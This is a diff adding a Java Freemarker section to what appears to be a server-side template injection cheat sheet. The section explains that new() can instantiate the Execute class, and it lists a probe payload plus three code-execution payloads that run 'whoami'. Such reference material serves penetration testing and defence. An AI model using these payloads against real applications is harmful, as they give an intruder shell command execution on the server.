@@ -113,3 +113,21 @@ To execute a shell command just wrap your command in backticks.
 
 ### <mark style="color:yellow;">5. Java - Freemarker</mark>
 
+The most popular template engine for Java.
+
+**Vulnerable code snippet:**
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**SSTI testing payloads:**
+
+The **new()** command is used to instantiate classes -> execute class can be used to execute shell commands.
+
+* ${7\*7}  ->  49
+
+<mark style="color:green;">**For Code Execution:**</mark>
+
+* <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami")}
+* \[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('whoami')}
+* ${"freemarker.template.utility.Execute"?new()("whoami")}
+
